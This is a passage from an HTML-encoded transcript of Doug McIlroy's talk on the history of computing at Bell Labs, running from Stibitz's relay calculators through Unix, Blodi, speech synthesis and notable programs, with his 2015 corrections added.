0.7em;&#34;&gt;4:29&lt;/span&gt;&#xA;Anyway, in West Street, there were four separate remote stations from which the complex calculator could be accessed.  It was not time sharing.  You actually reserved your time on the machine, and only one of the four terminals worked at a time.&#xA;In 1940, this machine was shown off to the world at the AMS annual convention, which happened to be held in Hanover at Dartmouth that year, and mathematicians could wonder at remote computing, doing computation on an electromechanical calculator at 300 miles away.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;5:22&lt;/span&gt;&#xA;Stibitz went on from there to make a whole series of relay machines.  Many of them were made for the government during the war.  They were named, imaginatively, Mark I through Mark VI.&#xA;I have read some of his patents.  They’re kind of fun.  One is a patent on conditional transfer. [laughter]  And how do you do a conditional transfer?&#xA;Well these gadgets were, the relay calculator was run from your fingers, I mean the complex calculator.&#xA;The later calculators, of course, if your fingers were a teletype, you could perfectly well feed a paper tape in,&#xA;because that was standard practice.  And these later machines were intended really to be run more from paper tape.&#xA;And the conditional transfer was this: you had two teletypes, and there’s a code that says &#34;time to read from the other teletype&#34;.  Loops were of course easy to do.  You take paper and [laughter; presumably Doug curled a piece of paper to form a physical loop].&#xA;These machines never got to the point of having stored programs.&#xA;But they got quite big.  I saw, one of them was here in 1954, and I did see it, behind glass, and if you’ve ever seen these machines in the, there’s one in the Franklin Institute in Philadelphia, and there’s one in the Science Museum in San Jose, you know these machines that drop balls that go wandering sliding around and turning battle wheels and ringing bells and who knows what.  It kind of looked like that.&#xA;It was a very quiet room, with just a little clicking of relays, which is what a central office used to be like.  It was the one air-conditioned room in Murray Hill, I think.  This machine ran, the Mark VI, well I think that was the Mark V, the Mark VI actually went to Aberdeen.&#xA;This machine ran for a good number of years, probably six, eight.&#xA;And it is said that it never made an undetected error. [laughter]&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;8:30&lt;/span&gt;&#xA;What that means is that it never made an error that it did not diagnose itself and stop.&#xA;Relay technology was very very defensive.  The telephone switching system had to work.  It was full of self-checking,&#xA;and so were the calculators, so were the calculators that Stibitz made.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;9:04&lt;/span&gt;&#xA;Arithmetic was done in bi-quinary, a two out of five representation for decimal integers, and if there weren’t exactly two out of five relays activated it would stop.&#xA;This machine ran unattended over the weekends.  People would&#xA;bring their tapes in, and the operator would paste everybody’s tapes together.&#xA;There was a beginning of job code on the tape and there was also a time indicator.&#xA;If the machine ran out of time, it automatically stopped and went to the next job.  If the machine caught itself in an error, it backed up to the current job and tried it again.&#xA;They would load this machine on Friday night, and on Monday morning, all the tapes, all the entries would be available on output tapes.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;Question: I take it they were using a different representation for loops&#xA;and conditionals by then.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;Doug: Loops were done actually by they would run back and forth across the tape now, on this machine.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;10:40&lt;/span&gt;&#xA;Then came the transistor in ’48.&#xA;At Whippany, they actually had a transistorized computer, which was a respectable minicomputer, a box about this big, running in 1954, it ran from 1954 to 1956 solidly as a test run.&#xA;The notion was that this computer might fly in an airplane.&#xA;And during that two-year test run, one diode failed.&#xA;In 1957, this machine called &lt;a href=&#34;http://www.cedmagic.com/history/tradic-transistorized.html&#34;&gt;TRADIC&lt;/a&gt;, did in fact fly in an airplane, but to the best of my knowledge, that machine was a demonstration machine.  It didn’t turn into a production machine.&#xA;About that time, we started buying commercial machines.&#xA;It’s wonderful to think about the set of different architectures that existed in that time.  The first machine we got was called a &lt;a href=&#34;http://www.columbia.edu/acis/history/cpc.html&#34;&gt;CPC from IBM&lt;/a&gt;.  And all it was was a big accounting machine with a very special plugboard on the side that provided an interpreter for doing ten-digit decimal arithmetic, including&#xA;opcodes for the trig functions and square root.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;12:30&lt;/span&gt;&#xA;It was also not a computer as we know it today,&#xA;because it wasn’t stored program, it had twenty-four memory locations as I recall, and it took its program instead of from tapes, from cards.  This was not a total advantage.  A tape didn’t get into trouble if you dropped it on the floor.  [laughter].&#xA;CPC, the operator would stand in front of it, and there, you&#xA;would go through loops by taking cards out, it took human intervention, to take the cards out of the output of the card reader and put them in the ?top?.  I actually ran some programs on the CPC ?...?.  It’s the kind of thing you can be nostalgic about, but it wasn’t actually fun.&#xA;[laughter]&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;13:30&lt;/span&gt;&#xA;The next machine was an &lt;a href=&#34;http://www.columbia.edu/acis/history/650.html&#34;&gt;IBM 650&lt;/a&gt;, and here, this was a stored program, with the memory being on drum.  There was no operating system for it.  It came with a manual: this is what the machine does.  And Michael Wolontis made an interpreter called the &lt;a href=&#34;http://hopl.info/showlanguage2.prx?exp=6497&#34;&gt;L1 interpreter&lt;/a&gt; for this machine, so you could actually program in, the manual told you how to program in binary, and L1 allowed you to give something like 10 for add and 9 for subtract, and program in decimal instead.  And of course that machine required interesting optimization, because it was a nice thing if the next program step were stored somewhere -- each program step had the address of the following step in it, and you would try to locate them around the drum so to minimize latency.  So there were all kinds of optimizers around, but I don’t think Bell Labs made ?...? based on this called &#34;soap&#34; from Carnegie Mellon.  That machine didn’t last very long.  Fortunately, a machine with core memory came out from IBM in about ’56, the 704.  Bell Labs was a little slow in getting one, in ’58.  Again, the machine came without an operating system.&#xA;In fact, but it did have Fortran, which really changed the world.&#xA;It suddenly made it easy to write programs.  But the way Fortran came from IBM, it came with a thing called the Fortran Stop Book.&#xA;This was a list of what happened, a diagnostic would execute the halt instruction, the operator would go read the panel lights and discover where the machine had stopped, you would then go look up in the stop book what that meant.&#xA;Bell Labs, with George Mealy and Gwen Hanson, made an operating system, and one of the things they did was to bring the stop book to heel.  They took the compiler, replaced all the stop instructions with jumps to somewhere, and allowed the program instead of stopping to go on to the next trial.&#xA;By the time I arrived at Bell Labs in 1958, this thing was running nicely.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;[&lt;i&gt;McIlroy comments, 2015&lt;/i&gt;: I’m pretty sure I was wrong in saying Mealy and Hanson brought&#xA;the stop book to heel. They built the OS, but I believe Dolores&#xA;Leagus tamed Fortran. (Dolores was the most accurate programmer I&#xA;ever knew. She’d write 2000 lines of code before testing a single&#xA;line--and it would work.)]&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;16:36&lt;/span&gt;&#xA;Bell Labs continued to be a major player in operating systems.&#xA;This was called BESYS.  BE was the SHARE abbreviation for Bell Labs.  Each company that belonged to Share, which was the IBM users group, ahd a two letter abbreviation.  It’s hard to imagine taking all the computer users now and giving them a two-letter abbreviation.  BESYS went through many generations, up to BESYS 5, I believe.  Each one with innovations.  IBM delivered a machine, the 7090, in 1960.  This machine had interrupts in it, but IBM didn’t use them.  But BESYS did.  And that sent IBM back to the drawing board to make it work.  [Laughter]&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;17:48&lt;/span&gt;&#xA;Rob Pike:  It also didn’t have memory protection.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;Doug: It didn’t have memory protection either, and a lot of people actually got IBM to put memory protection in the 7090, so that one could leave the operating system resident in the presence of a wild program, an idea that the PC didn’t discover until, last year or something like that.  [laughter]&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;Big players then, &lt;a href=&#34;http://en.wikipedia.org/wiki/Richard_Hamming&#34;&gt;Dick Hamming&lt;/a&gt;, a name that I’m sure everybody knows,&#xA;was sort of the numerical analysis guru, and a seer.&#xA;He liked to make outrageous predictions.  He predicted in 1960, that half of Bell Labs was going to be busy doing something with computers eventually.&#xA;?...? exaggerating some ?...? abstract in his thought.&#xA;He was wrong.&#xA;Half was a gross underestimate.  Dick Hamming retired twenty years ago, and just this June he completed his full twenty years term in the Navy, which entitles him again to retire from the Naval Postgraduate Institute in Monterey.  Stibitz, incidentally died, I think within the last year.&#xA;He was doing medical instrumentation at Dartmouth essentially, near the end.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;[&lt;i&gt;McIlroy comments, 2015&lt;/i&gt;: I’m not sure what exact unintelligible words I uttered about Dick&#xA;Hamming. When he predicted that half the Bell Labs budget would&#xA;be related to computing in a decade, people scoffed in terms like&#xA;&amp;ldquo;that’s just Dick being himelf, exaggerating for effect&amp;rdquo;.]&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;20:00&lt;/span&gt;&#xA;Various problems intrigued, besides the numerical problems, which in fact were stock in trade, and were the real justification for buying machines, until at least the ’70s I would say.  But some non-numerical problems had begun to tickle the palette of the math department.  Even G A Campbell got interested in graph theory, the reason being he wanted to think of all the possible ways you could take the three wires and the various parts of the telephone and connect them together, and try permutations to see what you could do about reducing sidetone by putting things into the various parts of the circuit, and devised every possibly way of connecting the telephone up.  And that was sort of the beginning of combinatorics at Bell Labs.  John Reardon, a mathematician parlayed this into a major subject.  Two problems which are now deemed as computing problems, have intrigued the math department for a very long time, and those are the minimum spanning tree problem, and the wonderfully ?comment about Joe Kruskal, laughter?&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;21:50&lt;/span&gt;&#xA;And in the 50s Bob Prim and Kruskal, who I don’t think worked on the Labs at that point, invented algorithms for the minimum spanning tree.  Somehow or other, computer scientists usually learn these algorithms, one of the two at least, as Dijkstra’s algorithm, but he was a latecomer.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;[&lt;i&gt;McIlroy comments, 2015&lt;/i&gt;:&#xA;I erred in attributing Dijkstra’s algorithm to Prim and Kruskal. That&#xA;honor belongs to yet a third member of the math department: Ed&#xA;Moore. (Dijkstra’s algorithm is for shortest path, not spanning&#xA;tree.)]&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;Another pet was the traveling salesman.  There’s been a long list of people at Bell Labs who played with that: Shen Lin and Ron Graham and David Johnson and dozens more, oh and ?...?.  And then another problem is the Steiner minimum spanning tree, where you’re allowed to add points to the graph.  Every one of these problems grew, actually had a justification in telephone billing.  One jurisdiction or another would specify that the way you bill for a private line network was in one jurisdiction by the minimum spanning tree.  In another jurisdiction, by the traveling salesman route.  NP-completeness wasn’t a word in the vocabulary of lawmakers [laughter].  And the &lt;a href=&#34;http://en.wikipedia.org/wiki/Steiner_tree&#34;&gt;Steiner problem&lt;/a&gt; came up because customers discovered they could beat the system by inventing offices in the middle of Tennessee that had nothing to do with their business, but they could put the office at a Steiner point and reduce their phone bill by adding to what the service that the Bell System had to give them.  So all of these problems actually had some justification in billing besides the fun.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;24:15&lt;/span&gt;&#xA;Come the 60s, we actually started to hire people for computing per se.  I was perhaps the third person who was hired with a Ph.D. to help take care of the computers and I’m told that the then director and head of the math department, Hendrick Bode, had said to his people, &#34;yeah, you can hire this guy, instead of a real mathematician, but what’s he gonna be doing in five years?&#34; [laughter]&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;25:02&lt;/span&gt;&#xA;Nevertheless, we started hiring for real in about ’67.  Computer science got split off from the math department.  I had the good fortune to move into the office that I’ve been in ever since then.  Computing began to make, get a personality of its own.  One of the interesting people that came to Bell Labs for a while was Hao Wang.  Is his name well known?  [Pause]  One nod.  Hao Wang was a philosopher and logician, and we got a letter from him in England out of the blue saying &#34;hey you know, can I come and use your computers?  I have an idea about theorem proving.&#34;  There was theorem proving in the air in the late 50s, and it was mostly pretty thin stuff.  Obvious that the methods being proposed wouldn’t possibly do anything more difficult than solve tic-tac-toe problems by enumeration.  Wang had a notion that he could mechanically prove theorems in the style of Whitehead and Russell’s great treatise Principia Mathematica in the early patr of the century.  He came here, learned how to program in machine language, and took all of Volume I of Principia Mathematica --&#xA;if you’ve ever hefted Principia, well that’s about all it’s good for, it’s a real good door stop.  It’s really big.  But it’s theorem after theorem after theorem in propositional calculus.  Of course, there’s a decision procedure for propositional calculus, but he was proving them more in the style of Whitehead and Russell.  And when he finally got them all coded and put them into the computer, he proved the entire contents of this immense book in eight minutes.&#xA;This was actually a neat accomplishment.  Also that was the beginning of all the language theory.  We hired people like &lt;a href=&#34;http://www1.cs.columbia.edu/~aho/&#34;&gt;Al Aho&lt;/a&gt; and &lt;a href=&#34;http://infolab.stanford.edu/~ullman/&#34;&gt;Jeff Ullman&lt;/a&gt;, who probed around every possible model of grammars, syntax, and all of the things that are now in the standard undergraduate curriculum, were pretty well nailed down here, on syntax and finite state machines and so on were pretty well nailed down in the 60s.  Speaking of finite state machines, in the 50s, both Mealy and Moore, who have two of the well-known models of finite state machines, were here.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;28:40&lt;/span&gt;&#xA;During the 60s, we undertook an enormous development project in the guise of research, which was &lt;a href=&#34;http://www.multicians.org/&#34;&gt;MULTICS&lt;/a&gt;, and it was the notion of MULTICS was computing was the public utility of the future.  Machines were very expensive, and ?indeed? like you don’t own your own electric generator, you rely on the power company to do generation for you, and it was seen that this was a good way to do computing -- time sharing -- and it was also recognized that shared data was a very good thing.  MIT pioneered this and Bell Labs joined in on the MULTICS project, and this occupied five years of system programming effort, until Bell Labs pulled out, because it turned out that MULTICS was too ambitious for the hardware at the time, and also with 80 people on it was not exactly a research project.  But, that led to various people who were on the project, in particular &lt;a href=&#34;http://en.wikipedia.org/wiki/Ken_Thompson&#34;&gt;Ken Thompson&lt;/a&gt; -- right there -- to think about how to -- &lt;a href=&#34;http://en.wikipedia.org/wiki/Dennis_Ritchie&#34;&gt;Dennis Ritchie&lt;/a&gt; and Rudd Canaday were in on this too -- to think about how you might make a pleasant operating system with a little less resources.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;30:30&lt;/span&gt;&#xA;And Ken found -- this is a story that’s often been told, so I won’t go into very much of unix -- Ken found an old machine cast off in the corner, the &lt;a href=&#34;http://en.wikipedia.org/wiki/GE-600_series&#34;&gt;PDP-7&lt;/a&gt;, and put up this little operating system on it, and we had immense &lt;a href=&#34;http://en.wikipedia.org/wiki/GE-600_series&#34;&gt;GE635&lt;/a&gt; available at the comp center at the time, and I remember as the department head, muscling in to use this little computer to be, to get to be Unix’s first user, customer, because it was so much pleasanter to use this tiny machine than it was to use the big and capable machine in the comp center.  And of course the rest of the story is known to everybody and has affected all college campuses in the country.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;31:33&lt;/span&gt;&#xA;Along with the operating system work, there was a fair amount of language work done at Bell Labs.  Often curious off-beat languages.  One of my favorites was called &lt;a href=&#34;http://hopl.murdoch.edu.au/showlanguage.prx?exp=6937&amp;language=BLODI-B&#34;&gt;Blodi&lt;/a&gt;, B L O D I, a block diagram compiler by Kelly and Vyssotsky.  Perhaps the most interesting early uses of computers in the sense of being unexpected, were those that came from the acoustics research department, and what the Blodi compiler was invented in the acoustic research department for doing digital simulations of sample data system.  DSPs are classic sample data systems,&#xA;where instead of passing analog signals around, you pass around streams of numerical values.  And Blodi allowed you to say here’s a delay unit, here’s an amplifier, here’s an adder, the standard piece parts for a sample data system, and each one was described on a card, and with description of what it’s wired to.  It was then compiled into one enormous single straight line loop for one time step.  Of course, you had to rearrange the code because some one part of the sample data system would feed another and produce really very efficient 7090 code for simulating sample data systems.&#xA;By in large, from that time forth, the acoustic department stopped making hardware.  It was much easier to do signal processing digitally than previous ways that had been analog.  Blodi had an interesting property.  It was the only programming language I know where -- this is not my original observation, Vyssotsky said -- where you could take the deck of cards, throw it up the stairs, and pick them up at the bottom of the stairs, feed them into the computer again, and get the same program out.  Blodi had two, aside from syntax diagnostics, it did have one diagnostic when it would fail to compile, and that was &#34;somewhere in your system is a loop that consists of all delays or has no delays&#34; and you can imagine how they handled that.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;35:09&lt;/span&gt;&#xA;Another interesting programming language of the 60s was &lt;a href=&#34;http://www.knowltonmosaics.com/&#34;&gt;Ken Knowlten&lt;/a&gt;’s &lt;a href=&#34;http://beflix.com/beflix.php&#34;&gt;Beflix&lt;/a&gt;.  This was for making movies on something with resolution kind of comparable to 640x480, really coarse, and the&#xA;programming notion in here was bugs.  You put on your grid a bunch of bugs, and each bug carried along some data as baggage,&#xA;and then you would do things like cellular automata operations.  You could program it or you could kind of let it go by itself.  If a red bug is next to a blue bug then it turns into a green bug on the following step and so on.  &lt;span style=&#34;font-size: 0.7em;&#34;&gt;36:28&lt;/span&gt;  He and Lillian Schwartz made some interesting abstract movies at the time.  It also did some interesting picture processing.  One wonderful picture of a reclining nude, something about the size of that blackboard over there, all made of pixels about a half inch high each with a different little picture in it, picked out for their density, and so if you looked at it close up it consisted of pickaxes and candles and dogs, and if you looked at it far enough away, it was a &lt;a href=&#34;http://blog.the-eg.com/2007/12/03/ken-knowlton-mosaics/&#34;&gt;reclining nude&lt;/a&gt;.  That picture got a lot of play all around the country.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;Lorinda Cherry: That was with Leon, wasn’t it?  That was with &lt;a href=&#34;https://en.wikipedia.org/wiki/Leon_Harmon&#34;&gt;Leon Harmon&lt;/a&gt;.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;Doug: Was that Harmon?&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;Lorinda: ?...?&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;Doug: Harmon was also an interesting character.  He did more things than pictures.  I’m glad you reminded me of him.  I had him written down here.  Harmon was a guy who among other things did a block diagram compiler for writing a handwriting recognition program.  I never did understand how his scheme worked, and in fact I guess it didn’t work too well.  [laughter]&#xA;It didn’t do any production ?things? but it was an absolutely&#xA;immense sample data circuit for doing handwriting recognition.&#xA;Harmon’s most famous work was trying to estimate the information content in a face.  And every one of these pictures which are a cliche now, that show a face digitized very coarsely, go back to Harmon’s &lt;a href=&#34;https://web.archive.org/web/20080807162812/http://www.doubletakeimages.com/history.htm&#34;&gt;first psychological experiments&lt;/a&gt;, when he tried to find out how many bits of picture he needed to try to make a face recognizable.  He went around and digitized about 256 faces from Bell Labs and did real psychological experiments asking which faces could be distinguished from other ones.  I had the good fortune to have one of the most distinguishable faces, and consequently you’ll find me in freshman psychology texts through no fault of my own.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;39:15&lt;/span&gt;&#xA;Another thing going on the 60s was the halting beginning here of interactive computing.  And again the credit has to go to the acoustics research department, for good and sufficient reason.  They wanted to be able to feed signals into the machine, and look at them, and get them back out.  They bought yet another weird architecture machine called the &lt;a href=&#34;http://www.piercefuller.com/library/pb250.html&#34;&gt;Packard Bell 250&lt;/a&gt;, where the memory elements were &lt;a href=&#34;http://en.wikipedia.org/wiki/Delay_line_memory&#34;&gt;mercury delay lines&lt;/a&gt;.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;Question: Packard Bell?&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;Doug: Packard Bell, same one that makes PCs today.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;40:10&lt;/span&gt;&#xA;They hung this off of the comp center 7090 and put in a scheme for quickly shipping jobs into the job stream on the 7090.  The Packard Bell was the real-time terminal that you could play with and repair stuff, ?...? off the 7090, get it back, and then you could play it.  From that grew some graphics machines also, built by ?...? et al.  And it was one of the old graphics machines&#xA;in fact that Ken picked up to build Unix on.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;40:55&lt;/span&gt;&#xA;Another thing that went on in the acoustics department was synthetic speech and music.  &lt;a href=&#34;http://csounds.com/mathews/index.html&#34;&gt;Max Mathews&lt;/a&gt;, who was the the director of the department has long been interested in computer music.  In fact since retirement he spent a lot of time with Pierre Boulez in Paris at a wonderful institute with lots of money simply for making synthetic music.  He had a language called Music 5.  Synthetic speech or, well first of all simply speech processing was pioneered particularly by &lt;a href=&#34;http://en.wikipedia.org/wiki/John_Larry_Kelly,_Jr&#34;&gt;John Kelly&lt;/a&gt;.  I remember my first contact with speech processing.  It was customary for computer operators, for the benefit of computer operators, to put a loudspeaker on the low bit of some register on the machine, and normally the operator would just hear kind of white noise.  But if you got into a loop, suddenly the machine would scream, and this signal could be used to the operator &#34;oh the machines in a loop.  Go stop it and go on to the next job.&#34;  I remember feeding them an Ackermann’s function routine once.  [laughter]  They were right.  It was a silly loop.  But anyway.  One day, the operators were ?...?.  The machine started singing.  Out of the blue.  &amp;ldquo;Help!  I’m caught in a loop.&amp;rdquo;.  [laughter]  And in a broad Texas accent, which was the recorded voice of John Kelly.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;43:14&lt;/span&gt;&#xA;However.  From there Kelly went on to do some speech synthesis.  Of course there’s been a lot more speech synthesis work done since, by &lt;span style=&#34;font-size: 0.7em;&#34;&gt;43:31&lt;/span&gt; folks like Cecil Coker, Joe Olive.  But they produced a record, which unfortunately I can’t play because records are not modern anymore.  And everybody got one in the Bell Labs Record, which is a magazine, contained once a record from the acoustics department, with both speech and music and one very famous combination where the computer played and sang &#34;A Bicycle Built For Two&#34;.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;?...?&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;44:32&lt;/span&gt;&#xA;At the same time as all this stuff is going on here, needless&#xA;to say computing is going on in the rest of the Labs.  it was about early 1960 when the math department lost its monopoly on computing machines and other people started buying them too, but for switching.  The first experiments with switching computers were operational in around 1960.  They were planned for several years prior to that; essentially as soon as the transistor was invented, the making of electronic rather than electromechanical switching machines was anticipated.  Part of the saga of the switching machines is cheap memory.  These machines had enormous memories -- thousands of words.  [laughter]  And it was said that the present worth of each word of memory that programmers saved across the Bell System was something like eleven dollars, as I recall.  And it was worthwhile to struggle to save some memory.  Also, programs were permanent.  You were going to load up the switching machine with switching program and that was going to run.  You didn’t change it every minute or two.  And it would be cheaper to put it in read only memory than in core memory.  And there was a whole series of wild read-only memories, both tried and built.&#xA;The first experimental Essex System had a thing called the flying spot store&#xA;which was large photographic plates with bits on them and CRTs projecting on the plates and you would detect underneath on the photodetector whether the bit was set or not.  That was the program store of Essex.  The program store of the first ESS systems consisted of twistors, which I actually am not sure I understand to this day, but they consist of iron wire with a copper wire wrapped around them and vice versa.  There were also experiments with an IC type memory called the waffle iron.  Then there was a period when magnetic bubbles were all the rage.  As far as I know, although microelectronics made a lot of memory, most of the memory work at Bell Labs has not had much effect on ?...?.  Nice tries though.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;48:28&lt;/span&gt;&#xA;Another thing that folks began to work on was the application of (and of course, right from the start) computers to data processing.  When you owned equipment scattered through every street in the country, and you have a hundred million customers, and you have bills for a hundred million transactions a day, there’s really some big data processing going on.  And indeed in the early 60s, AT&amp;T was thinking of making its own data processing computers solely for billing.  Somehow they pulled out of that, and gave all the technology to IBM, and one piece of that technology went into use in high end equipment called tractor tapes.  Inch wide magnetic tapes that would be used for a while.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;49:50&lt;/span&gt;&#xA;By in large, although Bell Labs has participated until fairly recently in data processing in quite a big way, AT&amp;T never really quite trusted the Labs to do it right because here is where the money is.  I can recall one occasion when during strike of temporary employees, a fill-in employee like from the&#xA;Laboratories and so on, lost a day’s billing tape in Chicago.  And that was a million dollars.  And that’s generally speaking the money people did not until fairly recently trust Bell Labs to take good care of money, even though they trusted the Labs very well to make extremely reliable computing equipment for switches.&#xA;The downtime on switches is still spectacular by any industry standards.  The design for the first ones was two hours down in 40 years, and the design was met.  Great emphasis on reliability and redundancy, testing.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;51:35&lt;/span&gt;&#xA;Another branch of computing was for the government.  The whole Whippany Laboratories [time check]&#xA;Whippany, where we took on contracts for the government particularly in the computing era in anti-missile defense, missile defense, and underwater sound.  Missile defense was a very impressive undertaking.  It was about in the early ’63 time frame when it was estimated the amount of computation to do a reasonable job of tracking incoming missiles would be 30 M floating point operations a second.  In the day of the Cray that doesn’t sound like a great lot, but it’s more than your high end PCs can do.  And the machines were supposed to be reliable.  They designed the machines at Whippany, a twelve-processor multiprocessor, to no specs, enormously rugged, one watt transistors.  This thing in real life performed remarkably well.  There were sixty-five missile shots, tests across the Pacific Ocean ?...?  and Lorinda Cherry here actually sat there waiting for them to come in.  [laughter]  And only a half dozen of them really failed.  As a measure of the interest in reliability, one of them failed apparently due to processor error.  Two people were assigned to look at the dumps, enormous amounts of telemetry and logging information were taken during these tests, which are truly expensive to run.  Two people were assigned to look at the dumps.  A year later they had not found the trouble.  The team was beefed up.  They finally decided that there was a race condition in one circuit.  They then realized that this particular kind of race condition had not been tested for in all the simulations.  They went back and simulated the entire hardware system to see if its a remote possibility of any similar cases, found twelve of them, and changed the hardware.  But to spend over a year looking for a bug is a sign of what reliability meant.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;54:56&lt;/span&gt;&#xA;Since I’m coming up on the end of an hour, one could go on and on and on,&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;Crowd: go on, go on. [laughter]&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;55:10&lt;/span&gt;&#xA;Doug: I think I’d like to end up by mentioning a few of the programs that have been written at Bell Labs that I think are most surprising.  Of course there are lots of grand programs that have been written.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;I already mentioned the block diagram compiler.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;Another really remarkable piece of work was &lt;a href=&#34;eqn.pdf&#34;&gt;eqn&lt;/a&gt;, the equation&#xA;typesetting language, which has been imitated since, by Lorinda Cherry and Brian Kernighan.  The notion of taking an auditory syntax, the way people talk about equations, but only talk, this was not borrowed from any written notation before, getting the auditory one down on paper, that was very successful and surprising.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;Another of my favorites, and again Lorinda Cherry was in this one, with Bob Morris, was typo.  This was a program for finding spelling errors.  It didn’t know the first thing about spelling.  It would read a document, measure its statistics, and print out the words of the document in increasing order of what it thought the likelihood of that word having come from the same statistical source as the document.  The words that did not come from the statistical source of the document were likely to be typos, and now I mean typos as distinct from spelling errors, where you actually hit the wrong key.  Those tend to be off the wall, whereas phonetic spelling errors you’ll never find.  And this worked remarkably well.  Typing errors would come right up to the top of the list.  A really really neat program.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;57:50&lt;/span&gt;&#xA;Another one of my favorites was by Brenda Baker called &lt;a href=&#34;http://doi.acm.org/10.1145/800168.811545&#34;&gt;struct&lt;/a&gt;, which took Fortran programs and converted them into a structured programming language called Ratfor, which was Fortran with C syntax.  This seemed like a possible undertaking, like something you do by the seat of the pants and you get something out.  In fact, folks at Lockheed had done things like that before.  But Brenda managed to find theorems that said there’s really only one form, there’s a canonical form into which you can structure a Fortran program, and she did this.  It took your Fortran program, completely mashed it, put it out perhaps in almost certainly a different order than it was in Fortran connected by GOTOs, without any GOTOs, and the really remarkable thing was that authors of the program who clearly knew the way they wrote it in the first place, preferred it after it had been rearranged by Brendan.  I was astonished at the outcome of that project.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;59:19&lt;/span&gt;&#xA;Another first that happened around here was by Fred Grampp, who got interested in computer security.  One day he decided he would make a program for sniffing the security arrangements on a computer, as a service: Fred would never do anything crooked.  [laughter]  This particular program did a remarkable job, and founded a whole minor industry within the company.  A department was set up to take this idea and parlay it, and indeed ever since there has been some improvement in the way computer centers are managed, at least until we got Berkeley Unix.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;60:24&lt;/span&gt;&#xA;And the last interesting program that I have time to mention is one by &lt;a href=&#34;http://www.cs.jhu.edu/~kchurch/&#34;&gt;Ken Church&lt;/a&gt;.  He was dealing with -- text processing has always been a continuing ?...? of the research, and in some sense it has an application to our business because we’re handling speech, but he got into consulting with the department in North Carolina that has to translate manuals.  There are millions of pages of manuals in the Bell System and its successors, and ever since we’ve gone global, these things had to get translated into many languages.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;61:28&lt;/span&gt;&#xA;To help in this, he was making tools which would put up on the screen, graphed on the screen quickly a piece of text and its translation, because a translator, particularly a technical translator, wants to know, the last time we mentioned 